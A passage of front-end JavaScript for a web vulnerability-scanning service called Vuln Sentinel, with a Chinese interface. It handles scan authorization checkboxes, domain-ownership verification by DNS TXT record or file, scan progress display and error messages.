      }
      html += '</div>';
      if (item.ok) {
        html += '<div style="font-size:20px;font-weight:700;color:' + color + '">' + item.score + '</div>';
      } else {
        html += '<div style="font-size:12px;color:#808080">无评分</div>';
      }
      html += '</div>';
    });
    res.innerHTML = html;
    showToast('批量扫描完成');
  } catch (e) {
    res.innerHTML = '<div style="color:#c75450;padding:10px">网络错误：' + (e.message || e) + '</div>';
  } finally {
    if (btn) { btn.disabled = false; btn.textContent = '开始批量扫描'; }
  }
}

// ----- startScanDirect -----
function startScanDirect(urlOverride) {
  try {
  let urlInput = document.getElementById('scan-url');
  let url = urlInput ? urlInput.value.trim() : '';
  if (!url) { showToast('请输入目标网址'); return; }
  // 授权确认检查
  let authStep1 = document.getElementById('auth-check-step1');
  if (!authStep1 || !authStep1.checked) {
    showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。');
    return;
  }
  // 记录勾选时间
  try {
    let authTime = new Date().toISOString();
    localStorage.setItem('vs_auth_checked_at', authTime);
    // 在线模式：发送到后端（静默，不阻塞）
    if (isLoggedIn()) {
      authFetch('/api/scan-auth-log', {
        method: 'POST',
        body: JSON.stringify({ authorized_at: authTime })
      }).catch(function(){});
    }
  } catch(e) {}
  // 自动补全协议
  if (!/^https?:\/\//i.test(url)) {
    url = 'https://' + url;
    if (urlInput) urlInput.value = url;
  }
  if (!isLoggedIn()) { showToast('请先登录'); navigateTo('profile'); return; }
  // Vuln Sentinel fix: 同步首页授权状态到扫描页，避免 step1 勾了但 step3 没勾导致卡住
  // authStep1 已在函数开头声明，此处复用
  let authStep3 = document.getElementById('auth-check');
  if (authStep1 && authStep3 && authStep1.checked) {
    authStep3.checked = true;
    // 触发按钮状态更新
    let scanBtn = document.getElementById('scan-btn');
    if (scanBtn) scanBtn.disabled = false;
  }
  // Vuln Sentinel：已登录用户跳过 step3 二次确认，直接开始扫描（合规授权已在 step1 完成）
  // 同时把 URL 也填到 step3 输入框，保留 step3 备用
  let confirmedInput = document.getElementById('scan-url-confirmed');
  if (confirmedInput) confirmedInput.value = url;
  refreshScanStartStateSoon();
  // 直接触发扫描
  startScan();
  } catch (e) {
    console.error('startScanDirect error:', e);
    _scanInProgress = false;
    setButtonLoading("scan-btn", false);
    setButtonLoading("scan-btn-step1", false);
    showToast('启动失败：' + (e.message || String(e)));
  }
}

function updateScanStartState() {
  let urlInput = document.getElementById('scan-url');
  let url = urlInput ? urlInput.value.trim() : '';
  let hasUrl = !!url;
  let authStep1 = document.getElementById('auth-check-step1');
  let authStep3 = document.getElementById('auth-check');
  let step1Btn = document.getElementById('scan-btn-step1');
  let step3Btn = document.getElementById('scan-btn');
  let step1Ready = hasUrl && isLoggedIn();
  let step3Ready = hasUrl && !!(authStep3 && authStep3.checked);
  if (step1Btn) step1Btn.disabled = !step1Ready;
  if (step3Btn) step3Btn.disabled = !step3Ready;
  if (authStep1 && authStep1.checked && step1Btn && step1Btn.disabled) {
    step1Btn.disabled = false;
  }
}

function refreshScanStartStateSoon() {
  try { updateScanStartState(); } catch (e) {}
  setTimeout(function() { try { updateScanStartState(); } catch (e) {} }, 100);
  setTimeout(function() { try { updateScanStartState(); } catch (e) {} }, 500);
}

// ----- copyFixCode -----
function copyFixCode(textareaId) {
  let ta = document.getElementById(textareaId);
  if (!ta) return;
  let code = ta.value;
  let btn = document.getElementById(textareaId + '-btn');
  let oldText = btn ? btn.textContent : '';
  let done = function() {
    if (btn) {
      btn.textContent = '已复制';
      btn.style.background = 'rgba(115,201,144,0.2)';
      btn.style.color = '#16a34a';
      btn.style.borderColor = 'rgba(115,201,144,0.4)';
      setTimeout(function() {
        btn.textContent = oldText;
        btn.style.background = 'rgba(75,110,175,0.1)';
        btn.style.color = '#4f46e5';
        btn.style.borderColor = 'rgba(75,110,175,0.3)';
      }, 1500);
    }
  };
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(code).then(done).catch(function() {
      ta.select(); document.execCommand('copy'); done();
    });
  } else {
    ta.select();
    try { document.execCommand('copy'); done(); } catch (e) { showToast('复制失败，请手动选择'); }
  }
}

// ----- quickDemo -----
function quickDemo(url) {
  try {
  if (!isLoggedIn()) {
    showToast('请先登录后再使用');
    navigateTo('profile');
    return;
  }
  // 登录态：直接填入 URL + 自动勾选授权 + 一键扫描，跳过验证步骤
  let input = document.getElementById('scan-url');
  if (input) input.value = url;
  let authStep1 = document.getElementById('auth-check-step1');
  if (authStep1 && !authStep1.checked) {
    authStep1.checked = true;
    // 触发 change 事件，让 button 启用
    authStep1.dispatchEvent(new Event('change'));
  }
  // 记录授权勾选时间
  try {
    let authTime = new Date().toISOString();
    localStorage.setItem('vs_auth_checked_at', authTime);
    authFetch('/api/scan-auth-log', {
      method: 'POST',
      body: JSON.stringify({ authorized_at: authTime })
    }).catch(function(){});
  } catch(e) {}
  startScanDirect();
  } catch (e) {
    console.error('quickDemo error:', e);
    showToast('启动未完成：' + (e.message || String(e)), 'error');
  }
}

// ----- showFullScanDetail -----
function showFullScanDetail() {
  if (window._publicReportResult) {
    renderResult(window._publicReportResult);
  }
}

// ----- goVerifyStep2 -----
function goVerifyStep2() {
  let urlInput = document.getElementById('scan-url');
  let url = urlInput ? urlInput.value.trim() : '';
  if (!url) { showToast('请输入目标网址'); return; }
  // 自动补全协议
  if (!/^https?:\/\//i.test(url)) {
    url = 'https://' + url;
    if (urlInput) urlInput.value = url;
  }
  // 前端 URL 格式校验：允许常见域名和内网主机名
  try {
    let parsed = new URL(url);
    let host = parsed.hostname.toLowerCase();
    if (!host) {
      showToast('网址格式不正确，请输入完整域名（如 example.com）');
      return;
    }
    let isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host) || host.indexOf(':') >= 0;
    let isLocal = host === 'localhost';
    let hasDomain = host.indexOf('.') >= 0;
    if (!isIP && !isLocal && !hasDomain) {
      showToast('网址格式不正确，请输入完整域名（如 example.com）或 IP 地址');
      return;
    }
  } catch (e) {
    showToast('网址格式不正确，请输入有效的 URL');
    return;
  }
  // Generate verification token
  verifyToken = 'vs-' + Math.random().toString(36).substring(2, 10) + '-' + Date.now().toString(36);
  let host = getHost(url);
  let tokenEl = document.getElementById('verify-token');
  let dnsEl = document.getElementById('dns-record');
  let step1 = document.getElementById('verify-step-1');
  let step2 = document.getElementById('verify-step-2');
  let infoEl = document.getElementById('verify-method-info');
  let btnEl = document.getElementById('verify-confirm-btn');
  if (tokenEl) tokenEl.textContent = verifyToken;
  if (dnsEl) dnsEl.textContent = '_vuln-sentinel.' + host + ' TXT "' + verifyToken + '"';
  if (step1) step1.style.display = 'none';
  if (step2) step2.style.display = 'block';
  selectedVerifyMethod = '';
  if (infoEl) infoEl.innerHTML = '<p>请选择一种验证方式</p>';
  if (btnEl) btnEl.disabled = true;
}

// ----- selectVerifyMethod -----
function selectVerifyMethod(el, method) {
  selectedVerifyMethod = method;
  document.querySelectorAll('.verify-method').forEach(function(item) { item.classList.remove('selected'); });
  if (el) el.classList.add('selected');
  let info = document.getElementById('verify-method-info');
  if (info) {
    if (method === 'dns') {
      info.innerHTML = '<p>已选择 DNS TXT 验证。请在域名 DNS 管理中添加 TXT 记录后点击确认。</p>';
    } else {
      info.innerHTML = '<p>已选择网站文件验证。请在网站根目录创建验证文件后点击确认。</p>';
    }
  }
  let confirmBtn = document.getElementById('verify-confirm-btn');
  if (confirmBtn) confirmBtn.disabled = false;
}

// ----- skipVerification -----
function skipVerification() {
  if (!isLoggedIn()) { showToast('请先登录'); navigateTo('profile'); return; }
  let urlInput = document.getElementById('scan-url');
  let url = urlInput ? urlInput.value.trim() : '';
  if (!url) { showToast('请输入目标网址'); return; }
  // 自动补全协议
  if (!/^https?:\/\//i.test(url)) {
    url = 'https://' + url;
    if (urlInput) urlInput.value = url;
  }
  if (!confirm('跳过域名归属验证将直接进入扫描阶段。该选项仅适用于您已确认拥有该目标网站或正在测试环境使用的场景。\n\n继续吗？')) return;
  let confirmedInput = document.getElementById('scan-url-confirmed');
  if (confirmedInput) confirmedInput.value = url;
  let authStep3 = document.getElementById('auth-check');
  if (authStep3) authStep3.checked = true;
  updateScanStartState();
  let step2 = document.getElementById('verify-step-2');
  let step3 = document.getElementById('verify-step-3');
  if (step2) step2.style.display = 'none';
  if (step3) step3.style.display = 'block';
  showToast('已跳过验证，进入快速扫描');
}

// ----- confirmVerification -----
function confirmVerification() {
  if (!selectedVerifyMethod) { showToast('请先选择验证方式'); return; }
  if (!isLoggedIn()) { showToast('请先登录'); navigateTo('profile'); return; }
  let btn = document.getElementById('verify-confirm-btn');
  let urlInput = document.getElementById('scan-url');
  let url = urlInput ? urlInput.value.trim() : '';
  if (!url && urlOverride) {
    url = String(urlOverride).trim();
    if (urlInput) urlInput.value = url;
  }
  if (!url) { showToast('请输入目标网址'); return; }
  // 自动补全协议
  if (!/^https?:\/\//i.test(url)) {
    url = 'https://' + url;
    if (urlInput) urlInput.value = url;
  }
  if (btn) { btn.disabled = true; btn.textContent = '正在查询 DNS / 下载验证文件...'; }
  authFetch('/api/verify', {
    method: 'POST',
    body: JSON.stringify({ url: url, token: verifyToken, method: selectedVerifyMethod })
  }).then(function(resp) { return resp.json(); }).then(function(data) {
    if (btn) { btn.disabled = false; btn.textContent = '我已添加验证信息，确认验证'; }
    if (data.success) {
      let confirmedInput = document.getElementById('scan-url-confirmed');
      if (confirmedInput) confirmedInput.value = url;
      let authStep3 = document.getElementById('auth-check');
      if (authStep3) authStep3.checked = true;
      try { updateScanStartState(); } catch (e) {}
      let step2 = document.getElementById('verify-step-2');
      let step3 = document.getElementById('verify-step-3');
      if (step2) step2.style.display = 'none';
      if (step3) step3.style.display = 'block';
      showToast('验证通过：' + (data.message || ''));
    } else {
      showToast('验证失败：' + (data.message || '未找到验证信息'), 'error');
      let info = document.getElementById('verify-method-info');
      if (info) info.innerHTML = '<p style="color:var(--danger)">' + escapeHtml(data.message || '验证失败') + '</p>';
    }
  }).catch(function(err) {
    if (btn) { btn.disabled = false; btn.textContent = '我已添加验证信息，确认验证'; }
    showToast('验证请求失败：' + err.message, 'error');
  });
}

// ----- copyToken -----
function copyToken() {
  copyToClipboard(verifyToken);
  showToast('令牌 已复制');
}

// ----- calculateScore -----
function calculateScore(findings, hasFixConfig, hasPR) {
  let score = 100;
  findings.forEach(function(f) {
    if (f.level === '高风险') score -= 18;
    else if (f.level === '中风险') score -= 10;
    else if (f.level === '低风险') score -= 4;
  });
  if (hasFixConfig) score += 12;
  if (hasPR) score += 10;
  return Math.max(10, Math.min(98, score));
}

// ----- startScan -----
function startScan() {
  try {
  if (_scanInProgress) { showToast("扫描进行中，请稍候"); return; }
  if (!isLoggedIn() && !isPublicDemoTarget(url)) { showToast('请先登录后再使用扫描功能'); navigateTo('profile'); return; }
  _scanInProgress = true;
  setButtonLoading("scan-btn", true);
  setButtonLoading("scan-btn-step1", true);
  let authCb = document.getElementById('auth-check');
  let authStep1 = document.getElementById('auth-check-step1');
  let auth = (authCb && authCb.checked) || (authStep1 && authStep1.checked) || false;
  if (!auth) {
    _scanInProgress = false;
    setButtonLoading("scan-btn", false);
    setButtonLoading("scan-btn-step1", false);
    showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。');
    return;
  }
  if (authCb && !authCb.checked) authCb.checked = true;
  // 记录勾选时间
  try {
    let authTime = new Date().toISOString();
    localStorage.setItem('vs_auth_checked_at', authTime);
    authFetch('/api/scan-auth-log', {
      method: 'POST',
      body: JSON.stringify({ authorized_at: authTime })
    }).catch(function(){});
  } catch(e) {}
  // Vuln Sentinel 兼容：如果 scan-url-confirmed 是空（直接走 startScan），用 scan-url 兜底
  let confirmedInput = document.getElementById('scan-url-confirmed');
  let url = confirmedInput ? confirmedInput.value.trim() : '';
  if (!url) {
    let urlInput = document.getElementById('scan-url');
    url = urlInput ? urlInput.value.trim() : '';
    if (url && confirmedInput) confirmedInput.value = url;
  }
  if (!url) { _scanInProgress = false; setButtonLoading("scan-btn", false); showToast('请输入有效网址'); return; }

  // 自动补全 URL：不加协议默认 https://
  if (!/^https?:\/\//i.test(url)) {
    url = 'https://' + url;
  }

  // 前端 URL 格式校验：允许常见域名和内网主机名
  try {
    let parsed = new URL(url);
    let host = parsed.hostname.toLowerCase();
    if (!host) {
      _scanInProgress = false; setButtonLoading("scan-btn", false);
      showToast('网址格式不正确，请输入完整域名（如 example.com）');
      return;
    }
    // 允许 IP 地址、localhost、以及包含点号的域名
    // 仅拒绝明显无效的空主机名
    let isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(host) || host.indexOf(':') >= 0;
    let isLocal = host === 'localhost';
    let hasDomain = host.indexOf('.') >= 0;
    if (!isIP && !isLocal && !hasDomain) {
      _scanInProgress = false; setButtonLoading("scan-btn", false);
      showToast('网址格式不正确，请输入完整域名（如 example.com）或 IP 地址');
      return;
    }
  } catch (e) {
    _scanInProgress = false; setButtonLoading("scan-btn", false);
    showToast('网址格式不正确，请输入有效的 URL');
    return;
  }

  let host = getHost(url);
  navigateTo('result');

  // Show scanning progress UI
  let progressHtml = '<div class="report-header fade-in-up">' +
    '<div style="font-size:48px;margin-bottom:16px"></div>' +
    '<h2 style="margin-bottom:8px;font-size:clamp(16px,5vw,22px)">正在扫描 ' + escapeHtml(host) + '</h2>' +
    '<p style="color:var(--text-lighter);font-size:13px;margin-bottom:20px">安全扫描引擎正在执行目标扫描...</p>' +
    '<div style="max-width:min(320px,90vw);margin:0 auto 20px;background:rgba(255,255,255,0.1);border-radius:2px;height:8px;overflow:hidden">' +
    '<div id="scan-progress-bar" style="height:100%;background:linear-gradient(90deg,#4b6eaf,#818cf8);width:5%;border-radius:2px;transition:width 0.3s"></div></div>' +
    '<div id="scan-progress-text" style="font-size:12px;color:var(--text-lighter)">正在初始化扫描引擎...</div>' +
    '<button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:500;transition:background 0.15s" onmouseover="this.style.background=\'rgba(199,84,80,0.25)\'" onmouseout="this.style.background=\'rgba(199,84,80,0.15)\'"> 取消扫描</button>' +
    '</div>';
  let resultContent = document.getElementById('result-content');
  if (resultContent) resultContent.innerHTML = progressHtml;
  let scanDepthInput = document.querySelector('input[name="scan-depth"]:checked');
  let scanDepth = (scanDepthInput && scanDepthInput.value) || 'standard';
  let deepScan = scanDepth === 'deep';
  startRealScan(url, host, deepScan, auth);
  } catch (e) {
    console.error('startScan error:', e);
    _scanInProgress = false;
    setButtonLoading("scan-btn", false);
    setButtonLoading("scan-btn-step1", false);
    let rc = document.getElementById('result-content');
    if (rc) {
      rc.innerHTML = '<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">错误：</div><h3 style="color:var(--danger);margin-bottom:8px">启动失败</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在启动扫描时遇到问题。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：' + escapeHtml(e.message || String(e)) + '</p><button class="btn btn-primary" onclick="navigateTo(\'home\')"> 返回首页</button></div>';
    } else {
      showToast('启动失败：' + (e.message || String(e)), 'error');
    }
  }
}

// ----- cancelScan -----
function cancelScan() {
  if (!_scanInProgress) return;
  _scanCancelled = true;
  _scanInProgress = false;
  setButtonLoading("scan-btn", false);
  // 清除进度动画
  if (typeof finishStages === 'function') finishStages();
  if (typeof stopProgressAnimation === 'function') stopProgressAnimation();
  showToast('扫描已取消');
  // 返回首页
  setTimeout(function() {
    navigateTo('home');
    _scanCancelled = false;
  }, 300);
}

// ----- startRealScan -----
function startRealScan(url, host, deepScan, authorized) {
  // 启动多阶段动画
  animateStages();

  // 超时保护：标准扫描 60 秒，深度扫描 120 秒
  let scanTimeoutMs = deepScan ? 120000 : 60000;
  let timeoutId = setTimeout(function() {
    if (_scanCancelled) return;
    finishStages();
    setTimeout(function() {
      if (_scanCancelled) return;
      renderScanError('扫描超时，目标网站可能响应缓慢或无法访问。请检查网址是否正确，或稍后重试。', url);
      _scanInProgress = false;
      setButtonLoading("scan-btn", false);
      setButtonLoading("scan-btn-step1", false);
      setButtonLoading("scan-btn-step1", false);
    }, 600);
  }, scanTimeoutMs);

  // Try /api/scan
  authFetch('/api/scan', {
    method: 'POST',
    body: JSON.stringify({ url: url, depth: deepScan ? 'deep' : 'standard', authorized: !!authorized })
  }).then(function(resp) {
    if (_scanCancelled) return;
    clearTimeout(timeoutId);
    // 无论成功还是失败，都解析响应体以保留后端返回的具体错误信息
    return resp.json().then(function(data) {
      data._status = resp.status;
      return data;
    }).catch(function() {
      // 响应体非 JSON（如 502 网关错误返回 HTML）
      throw new Error('服务器返回异常（HTTP ' + resp.status + '），请稍后重试');
    });
  }).then(function(data) {
    if (_scanCancelled) return;
    clearTimeout(timeoutId);
    if (isPaymentRequired(data)) {
      finishStages();
      setTimeout(function() {
        if (_scanCancelled) return;
        showToast(paymentRequiredMessage(data), 'error');
        let rc = document.getElementById('result-content');
        if (rc) {
          rc.innerHTML = '<div class="card" style="text-align:center;padding:36px 20px"><div style="font-size:44px;margin-bottom:12px">额度不足</div><h3 style="margin:0 0 8px;color:var(--warning)">当前额度不够继续扫描</h3><p style="color:var(--text-secondary);font-size:13px;line-height:1.7;margin:0 0 16px">' + escapeHtml(paymentRequiredMessage(data)) + '</p><button class="btn btn-primary" onclick="navigateTo(\'billing\')">去充值</button> <button class="btn btn-secondary" onclick="navigateTo(\'profile\')">查看额度</button></div>';
        }
        updateUserCredits();
        _scanInProgress = false;
        setButtonLoading("scan-btn", false);
      }, 600);
      return;
    }
    // 非 200 响应或包含 error 字段时，显示后端的具体错误信息
    if (data._status && data._status >= 400) {
      finishStages();
      setTimeout(function() {
        if (_scanCancelled) return;
        let errMsg = extractError(data);
        // 对常见 HTTP 状态码补充提示
        if (data._status === 403) {
          errMsg = errMsg + '\n\n如需扫描自有域名，请先完成域名归属验证；如果只是体验功能，请改用 example.com、httpbin.org 等公开演示站点。';
        } else if (data._status === 429) {
          errMsg = '扫描请求过于频繁，请等待 1 分钟后重试。';
        }
        renderScanError(errMsg, url);
        _scanInProgress = false;
        setButtonLoading("scan-btn", false);
      }, 600);
      return;
    }
    if (data.error) {
      finishStages();
      setTimeout(function() {
        if (_scanCancelled) return;
        renderScanError(extractError(data), url);
        _scanInProgress = false;
        setButtonLoading("scan-btn", false);
      }, 600);
      return;
    }
    finishStages();
    setTimeout(function() {
      if (_scanCancelled) return;
      let merged = mergeRealData(url, data);
      lastScanResult = merged;
      saveScanHistory(merged);
      renderResult(merged);
      _scanInProgress = false;
      setButtonLoading("scan-btn", false);
      setButtonLoading("scan-btn-step1", false);
      updateUserCredits();
    }, 400);
  }).catch(function(err) {
    if (_scanCancelled) return;
    clearTimeout(timeoutId);
    finishStages();
    setTimeout(function() {
      if (_scanCancelled) return;
      // 保留真实错误信息，而非笼统的"连接失败"
      let errMsg = (err && err.message) ? err.message : '扫描服务连接失败，请检查网络或稍后重试';
      renderScanError(errMsg, url);
      _scanInProgress = false;
      setButtonLoading("scan-btn", false);
      setButtonLoading("scan-btn-step1", false);
    }, 600);
  });
}

// ----- mergeRealData -----
function mergeRealData(url, apiData) {
  // Build a scan result using real API data — 不再硬塞假 finding
  let host = getHost(url);
  // 防御性：确保 apiData 是对象
  apiData = apiData || {};
  // 防御性：确保 findings 是数组
  let findings = Array.isArray(apiData.findings) ? apiData.findings : [];
  // 归一化严重度：后端 severity（high/medium/low）→ 前端展示字段
  findings.forEach(function(f) {
    if (f.severity && !f.level_zh) {
      let zhMap = { high: '高风险', medium: '中风险', low: '低风险', critical: '严重' };
      f.level_zh = zhMap[f.severity] || '低风险';
      f.level = f.level_zh;
    }
  });

  let score = apiData.score;
  let riskLevel = apiData.risk_level;

  let ai报告 = {
    summary: '对 ' + host + ' 的真实安全扫描已完成。共发现 ' + findings.length + ' 个安全问题，综合安全评分为 ' + score + ' 分（满分 100）。',
    priority: findings.length > 0 ? '优先修复标记为"高风险"的安全问题。' : '安全状况良好，建议持续监控。',
    boundary: '本次检测基于真实 HTTP 响应头判断。'
  };

  return {
    url: url,
    time: new Date().toLocaleString('zh-CN'),
    score: score,
    risk_level: riskLevel,
    scan_mode: 'real',
    scan_id: apiData.scan_id || null,
    ai_report: ai报告,
    owasp_coverage: apiData.owasp_coverage || [],
    findings: findings,
    header_details: apiData.header_details || [],
    info_leaks: apiData.info_leaks || [],
    cors: apiData.cors || null,
    cookie_issues: apiData.cookie_issues || [],
    raw_headers: apiData.raw_headers || {},
    is_https: apiData.is_https !== false,
    restricted: apiData.restricted || false,
    restricted_reason: apiData.restricted_reason || '',
    restricted_code: apiData.restricted_code || '',
    redirected: apiData.redirected || false,
    redirect_reason: apiData.redirect_reason || '',
    // 保留 SRC 级字段供新渲染器使用
    headers: apiData.headers || apiData.raw_headers || {},
    waf: apiData.waf || (apiData.waf_list && apiData.waf_list[0] ? apiData.waf_list[0].name : null),
    ssl: apiData.ssl || apiData.ssl_info || {},
    duration_ms: apiData.duration_ms || 0,
    report_share_id: apiData.report_share_id || null,
    discovered_at: findings.length > 0 && findings[0].discovered_at ? findings[0].discovered_at : new Date().toISOString()
  };
}

// ----- renderScanError -----
function renderScanError(errorMsg, url) {
  let container = document.getElementById('result-content');
  if (!container) {
    setTimeout(function() { renderScanError(errorMsg, url); }, 0);
    return;
  }
  let safeUrl = escapeHtml(url);

  // 检测是否是登录/跳转长链接
  let is登录Url = /login|redirect|spm|havana|sso|auth|signin/i.test(url);
  let isLongUrl = url.length > 80;
  let mainDomain = '';
  try {
    let u = new URL(url);
    mainDomain = u.protocol + '//' + u.hostname;
  } catch (e) {}

  // 分类错误提示
  let isDnsFail = errorMsg && (errorMsg.indexOf('无法解析') !== -1 || errorMsg.indexOf('DNS') !== -1);
  let isTimeout = errorMsg && errorMsg.indexOf('超时') !== -1;
  let isConnectFail = errorMsg && errorMsg.indexOf('无法连接') !== -1;
  let isDomain验证 = errorMsg && (errorMsg.indexOf('域名归属验证') !== -1 || errorMsg.indexOf('域名验证') !== -1);

  if (isDomain验证) {
    // 深度扫描需要域名验证的专属引导
    let html = '<div class="card" style="padding:24px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.3);border-radius:2px;text-align:center;max-width:600px;margin:0 auto;">';
    html += '<div style="font-size:14px;font-weight:600;color:#4b6eaf;margin-bottom:12px">安全登录</div>';
    html += '<h3 style="margin:0 0 8px;color:#4b6eaf">深度扫描需要域名归属验证</h3>';
    html += '<p style="color:var(--text-secondary);margin:0 0 20px;font-size:14px;line-height:1.6">' + escapeHtml(errorMsg) + '</p>';
    html += '<p style="color:var(--text-secondary);margin:0 0 20px;font-size:13px">为了符合安全要求，深度扫描（爬虫 + 漏洞探测）需要先证明您拥有该域名。</p>';
    html += '<div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">';
    html += '<button onclick="document.getElementById(\'scan-url\').value=\'' + safeUrl + '\'; goVerifyStep2();" class="btn-primary" style="padding:10px 20px;border-radius:2px;border:none;background:#4b6eaf;color:white;cursor:pointer;font-size:14px">立即验证域名</button>';

    html += '<button onclick="startScanDirect(\'' + safeUrl + '\', false)" class="btn-secondary" style="padding:10px 20px;border-radius:2px;border:1px solid var(--border);background:transparent;color:var(--text-primary);cursor:pointer;font-size:14px">改用普通扫描</button>';
    html += '</div></div>';
    container.innerHTML = html;
    return;
  }

  let title = '扫描未完成';
  let subtitle = errorMsg;
  let reasons = [
    '&#x2022; 目标站点可能拒绝自动化请求（反爬机制）',
    '&#x2022; 目标需要登录或身份认证',
    '&#x2022; 当前 URL 是跳转/登录链接，不是主站',
    '&#x2022; 网站设置了访问限制（如 IP 黑名单）',
    '&#x2022; 网站已下线或服务器故障'
  ];
  if (isDnsFail) {
    title = '域名无法解析';
    reasons = [
      '&#x2022; 网址拼写错误，或域名尚未注册',
      '&#x2022; DNS 服务器暂时无法解析',
      '&#x2022; 本地网络 DNS 配置问题'
    ];
  }

  let html = '<div class="report-header fade-in-up">';
  html += '<div style="margin-bottom:12px">';
  html += '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">扫描未完成</span>';
  html += '</div>';
  html += '<div class="score-ring-wrap">';
  html += '<div class="score-ring" style="background:#3c3f41">';
  html += '<div class="score-value" style="color:#fff">--</div>';
  html += '<div class="score-label" style="color:rgba(255,255,255,0.7)">无法评分</div>';
  html += '</div></div>';
  html += '<div class="report-url">' + safeUrl + '</div>';
  html += '<div class="report-time">' + new Date().toLocaleString('zh-CN') + '</div>';
  html += '<span class="risk-badge high">未完成</span>';
  html += '</div>';

  html += '<div class="card fade-in-up" style="animation-delay:0.1s;text-align:center;padding:40px 20px">';
  html += '<div style="font-size:48px;margin-bottom:16px"></div>';
  html += '<h3 style="margin-bottom:12px;color:var(--danger)">' + title + '</h3>';
  html += '<p style="color:var(--text-light);margin-bottom:20px;max-width:400px;margin-left:auto;margin-right:auto">' + escapeHtml(subtitle) + '</p>';

  // 登录/跳转链接提示
  if (is登录Url || isLongUrl) {
    html += '<div style="background:rgba(240,167,50,0.1);border:1px solid rgba(240,167,50,0.3);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2;margin-bottom:16px">';
    html += '<p><strong>提示： 检测到登录/跳转长链接</strong></p>';
    html += '<p>建议扫描网站主域名，而不是登录页或跳转链接。</p>';
    if (mainDomain) {
      html += '<div style="margin-top:10px;text-align:center">';
      html += '<button class="btn btn-primary" onclick="retryScanWithUrl(\'' + escapeHtml(mainDomain) + '\')" style="font-size:13px"> 改扫主域名：' + escapeHtml(mainDomain) + '</button>';
      html += '</div>';
    }
    html += '</div>';
  }

  html += '<div style="background:var(--bg);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">';
  html += '<p><strong>可能的原因：</strong></p>';
  reasons.forEach(function(r) { html += '<p>' + r + '</p>'; });
  html += '</div>';

  // 修改网址重新扫描
  html += '<div style="margin-top:20px;text-align:left;border-top:1px solid var(--border);padding-top:20px">';
  html += '<label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">修改网址重新扫描：</label>';
  html += '<div style="display:flex;gap:8px">';
  html += '<input id="retry-url-input" type="url" value="' + safeUrl + '" style="flex:1;padding:10px 14px;border:2px solid var(--border);border-radius:2px;font-size:14px;outline:none" />';
  html += '<button class="btn btn-primary" onclick="retryScan()" style="white-space:nowrap"> 重试</button>';
  html += '</div>';
  html += '<div style="margin-top:12px;text-align:center">';
  html += '<button onclick="backToScanInput()" style="background:none;border:none;color:var(--primary);font-size:13px;cursor:pointer"><- 返回修改网址</button>';
  html += '</div></div>';
  html += '</div>';

  container.innerHTML = html;
  navigateTo('result');
}

// ----- retryScanWithUrl -----
function retryScanWithUrl(newUrl) {
  _scanInProgress = false;
  setButtonLoading("scan-btn", false);
  let input = document.getElementById('scan-url');
  if (input) input.value = newUrl;
  startScan();
}

// ----- backToScanInput -----
function backToScanInput() {
  // 回到扫描输入页（Step 1），重置所有状态
  _scanInProgress = false;
  setButtonLoading("scan-btn", false);
  let step1 = document.getElementById('verify-step-1');
  let step2 = document.getElementById('verify-step-2');
  let step3 = document.getElementById('verify-step-3');
  if (step1) step1.style.display = 'block';
  if (step2) step2.style.display = 'none';
  if (step3) step3.style.display = 'none';
  // 清空结果区域，避免旧内容干扰
  let resultContent = document.getElementById('result-content');
  if (resultContent) resultContent.innerHTML = '';
  navigateTo('scan');
}

// ----- retryScan -----
function retryScan() {
  // 重置扫描状态，允许重新扫描
  _scanInProgress = false;
  setButtonLoading("scan-btn", false);
  let input = document.getElementById('retry-url-input');
  if (!input) return;
  let url = input.value.trim();
  if (!url) { showToast('请输入有效网址'); return; }
  // 授权确认检查（深度扫描/重试时）
  let authCheck = document.getElementById('auth-check');
  if (!authCheck || !authCheck.checked) {
    showToast('请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。');
    return;
  }
  // 自动补全协议
  if (!/^https?:\/\//i.test(url)) {
    url = 'https://' + url;
  }
  input.value = url;
  let host = getHost(url);
  // 进入扫描进度 UI（多阶段动画）
  let container = document.getElementById('result-content');
  if (!container) return;
  let stages = [
    { id: 'dns', label: 'DNS 解析', detail: host },
    { id: 'connect', label: 'TCP 连接', detail: '443/80 端口' },
    { id: 'headers', label: '响应头判断', detail: '9 项安全头' },
    { id: 'ssl', label: 'SSL 证书检查', detail: '证书链/有效期' },
    { id: 'sensitive', label: '敏感路径扫描', detail: '12 个路径' },
    { id: 'waf', label: 'WAF 识别', detail: '6 类厂商指纹' },
    { id: 'report', label: '报告', detail: '评分/建议' }
  ];
  let stagesHtml = stages.map(function(s, i) {
    return '<div id="stage-' + s.id + '" class="scan-stage" style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:2px;margin-bottom:6px;opacity:0.4;transition:all 0.3s">' +
      '<div class="stage-icon" style="width:24px;height:24px;border-radius:50%;background:rgba(75,110,175,0.15);display:flex;align-items:center;justify-content:center;font-size:12px;color:#a5b4fc">...</div>' +
      '<div style="flex:1">' +
        '<div style="font-size:13px;font-weight:600">' + s.label + '</div>' +
        '<div style="font-size:11px;color:var(--text-secondary)">' + s.detail + '</div>' +
      '</div>' +
      '<div class="stage-status" style="font-size:11px;color:var(--text-secondary)">等待</div>' +
    '</div>';
  }).join('');
  let progressHtml = '<div class="report-header fade-in-up">' +
    // 3D 旋转的扫描雷达 + 百分比
